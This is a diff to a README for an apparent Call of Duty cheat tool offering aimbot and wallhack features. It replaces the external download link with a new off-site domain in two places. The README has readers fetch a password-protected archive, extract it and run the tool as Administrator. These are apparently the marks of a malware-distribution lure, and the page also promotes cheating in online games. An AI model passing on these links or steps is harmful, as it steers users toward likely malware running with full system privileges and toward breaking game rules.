@@ -6,7 +6,7 @@ Call of Duty trainer with wallhack, aimbot, triggerbot, radar hack, and no recoi
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -73,7 +73,7 @@ Based on popular tools like **EngineOwning**, **Phantom Overlay**, and **Warzone
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Call of Duty.
 4. Run the trainer **as Administrator**.
